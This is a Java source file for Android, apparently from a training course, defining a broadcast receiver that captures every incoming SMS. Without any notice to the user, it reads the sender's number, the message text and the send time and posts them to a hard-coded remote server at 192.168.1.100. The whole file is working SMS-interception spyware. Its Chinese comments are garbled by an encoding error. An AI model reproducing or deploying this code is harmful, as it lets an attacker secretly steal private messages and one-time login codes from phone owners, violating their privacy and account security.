package cn.itcast.sms;

import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;

import cn.itcast.utils.SocketHttpRequester;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSBroadcastReceiver extends BroadcastReceiver {
    //�ڽ�������߻�ȡ���������Ϣ���������Ϣ�����������Ͻ�������
	@Override
	public void onReceive(Context context, Intent intent) {
		Object[] pduses = (Object[])intent.getExtras().get("pdus");
		for(Object pdus : pduses){
			byte[] pdusmessage = (byte[]) pdus;//ûһ������
			SmsMessage sms = SmsMessage.createFromPdu(pdusmessage);
			String mobile = sms.getOriginatingAddress();//�õ��绰����
			String content = sms.getMessageBody();//�õ����ŵ�����
			Date date = new Date(sms.getTimestampMillis());//�õ����Ͷ��ž���ʱ��
			//2009-10-12 12:21:23
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//Ϊʵ�����ø�ʽ
			String sendtime = format.format(date);
			Map<String, String> params = new HashMap<String, String>();
			params.put("method", "getSMS");//���������ص�����ȫ�����ŵ�������
			params.put("mobile", mobile);
			params.put("content", content);
			params.put("sendtime", sendtime);
			try {//����socket�����������������������
				SocketHttpRequester.post("http://192.168.1.100:8080/videoweb/video/manage.do", params, "UTF-8");
			} catch (Exception e) {
				Log.e("SMSBroadcastReceiver", e.toString());
			}
		}
	}

}
